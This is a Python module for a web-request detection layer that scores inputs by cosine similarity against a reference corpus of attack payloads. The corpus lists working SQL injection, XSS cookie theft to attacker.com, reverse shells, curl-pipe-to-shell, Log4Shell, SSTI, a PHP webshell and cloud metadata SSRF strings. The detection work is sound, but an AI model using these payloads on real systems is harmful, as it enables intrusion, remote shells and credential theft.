"""
Semantic Detection Layer: Embedding & Cosine Similarity Engine (Layer 3 Specification).
Compares incoming requests against a reference vector corpus of known attack archetypes
to detect novel rewordings, structural variations, and zero-day evasions.
"""

from collections import Counter
import math
import re
from typing import Any, Dict, List, Optional, Tuple

# Reference Attack Corpus (Archetypes extracted from OWASP CRS, CSIC, and confirmed attack datasets)
REFERENCE_ATTACK_CORPUS: List[Tuple[str, str, float]] = [
    # (Attack Archetype Pattern, Category, Baseline Severity Weight)
    # SQLi Archetypes
    ("SELECT null, username, password FROM users WHERE id=1 UNION ALL SELECT", "SQLi", 5.0),
    ("1' OR '1'='1' --", "SQLi", 5.0),
    ("admin' OR 1=1 OR ''='", "SQLi", 5.0),
    ("1 AND SLEEP(5) AND '1'='1", "SQLi", 5.0),
    ("1; DROP TABLE users; --", "SQLi", 5.0),
    ("1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --", "SQLi", 5.0),
    ("1' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 64 --", "SQLi", 5.0),
    ("1' UNION SELECT 1, LOAD_FILE('/etc/passwd') INTO OUTFILE '/var/www/shell.php'", "SQLi", 5.0),
    ("1' AND DBMS_LOCK.SLEEP(5) --", "SQLi", 5.0),

    # XSS Archetypes
    ("<script>alert(document.cookie)</script>", "XSS", 4.5),
    ("<svg/onload=fetch('http://attacker.com/?c='+document.cookie)>", "XSS", 4.5),
    ("<img src=x onerror=alert(window.origin)>", "XSS", 4.5),
    ("<iframe srcdoc='<script>alert(1)</script>'>", "XSS", 4.5),
    ("javascript:alert(document.domain)", "XSS", 4.5),
    ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "XSS", 4.5),
    ("<details ontoggle=alert(1)>", "XSS", 4.5),
    ("[].filter.constructor('alert(1)')()", "XSS", 4.5),

    # RCE Archetypes
    ("; cat /etc/passwd; id; whoami", "RCE", 5.0),
    ("| /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "RCE", 5.0),
    ("`curl http://attacker.com/malware.sh | sh`", "RCE", 5.0),
    ("$(nc -e /bin/sh 10.0.0.1 4444)", "RCE", 5.0),
    ("; powershell.exe -enc JABhID0A...", "RCE", 5.0),
    ("cat${IFS}/etc/shadow", "RCE", 5.0),

    # LFI & Path Traversal Archetypes
    ("../../../../etc/passwd", "LFI", 4.5),
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "LFI", 4.5),
    ("php://filter/convert.base64-encode/resource=index.php", "LFI", 4.5),
    ("/proc/self/environ", "LFI", 4.5),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "LFI", 4.5),

    # SSRF & Metadata Archetypes
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "SSRF", 4.5),
    ("http://metadata.google.internal/computeMetadata/v1/", "SSRF", 4.5),
    ("http://2130706433:8000/", "SSRF", 4.0),
    ("http://0x7f000001/", "SSRF", 4.0),
    ("gopher://127.0.0.1:6379/_flushall", "SSRF", 4.5),

    # Log4j / SSTI / Deserialization Archetypes
    ("${jndi:ldap://attacker.com/exploit}", "Log4Shell", 5.0),
    ("{{7*7}} {{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "SSTI", 4.5),
    ("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "XXE", 4.5),
    ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "Deserialization", 5.0),
    ("<?php @eval($_POST['cmd']); ?>", "Webshell", 5.0),

    # API Security Archetypes
    ('{"role": "admin", "is_admin": true, "permissions": ["*"]}', "APIAssignment", 3.5),
    ("{ __schema { types { name fields { name } } } }", "GraphQL", 3.5),
    ("eyJhbGciOiAibm9uZSIgfQ.eyJzdWIiOiAiYWRtaW4ifQ.", "JWT", 4.0),
]


class Vectorizer:
    """
    Sub-word token and character 3-gram vectorizer with L2 normalization.
    """

    @classmethod
    def get_features(cls, text: str) -> List[str]:
        if not text:
            return []
        tokens = re.findall(r"[a-zA-Z_]+|\d+|[^\w\s]", text.lower())
        # Character 3-grams for obfuscation resistance
        char_ngrams = [text[i:i + 3].lower() for i in range(len(text) - 2)]
        return tokens + char_ngrams

    @classmethod
    def vectorize(cls, text: str) -> Dict[str, float]:
        feats = cls.get_features(text)
        if not feats:
            return {}
        counts = Counter(feats)
        # Compute L2 norm
        norm = math.sqrt(sum(v * v for v in counts.values()))
        if norm == 0:
            return {}
        return {k: v / norm for k, v in counts.items()}


class SemanticEmbeddingEngine:
    """
    Computes semantic cosine similarity against pre-embedded reference attack clusters.
    """

    _REFERENCE_VECTORS: Optional[List[Tuple[str, str, Dict[str, float], float]]] = None
    _CACHE: Dict[str, Tuple[float, str, str]] = {}

    @classmethod
    def _init_corpus(cls):
        if cls._REFERENCE_VECTORS is None:
            cls._REFERENCE_VECTORS = []
            for archetype, category, weight in REFERENCE_ATTACK_CORPUS:
                vec = Vectorizer.vectorize(archetype)
                cls._REFERENCE_VECTORS.append((archetype, category, vec, weight))

    @classmethod
    def cosine_similarity(cls, vec_a: Dict[str, float], vec_b: Dict[str, float]) -> float:
        """Compute cosine similarity between two unit-normalized sparse vectors."""
        if not vec_a or not vec_b:
            return 0.0
        # Iterate over smaller vector for fast dot product
        if len(vec_a) > len(vec_b):
            vec_a, vec_b = vec_b, vec_a
        return sum(val * vec_b.get(k, 0.0) for k, val in vec_a.items())

    @classmethod
    def evaluate(cls, text: str) -> Tuple[float, str, str]:
        """
        Calculates semantic anomaly score (0.0 to 10.0) based on cosine similarity against attack corpus.
        Returns: (score_semantic, top_category, matched_archetype)
        """
        if not text or len(text.strip()) < 3:
            return 0.0, "Clean", ""

        if text in cls._CACHE:
            return cls._CACHE[text]

        cls._init_corpus()
        target_vec = Vectorizer.vectorize(text)
        if not target_vec:
            return 0.0, "Clean", ""

        max_sim = 0.0
        best_cat = "Clean"
        best_archetype = ""
        best_weight = 1.0

        for archetype, category, ref_vec, weight in cls._REFERENCE_VECTORS: # type: ignore
            sim = cls.cosine_similarity(target_vec, ref_vec)
            if sim > max_sim:
                max_sim = sim
                best_cat = category
                best_archetype = archetype
                best_weight = weight

        # Scale similarity (0.0 to 1.0) into semantic anomaly score (0.0 to 10.0)
        # Apply non-linear boost for high similarity (> 0.6)
        if max_sim >= 0.60:
            semantic_score = round(max_sim * 10.0 * (best_weight / 5.0), 2)
        elif max_sim >= 0.45:
            semantic_score = round(max_sim * 6.0, 2)
        else:
            semantic_score = round(max_sim * 2.0, 2)

        res = (semantic_score, best_cat, best_archetype)
        if len(cls._CACHE) < 2000:
            cls._CACHE[text] = res
        return res
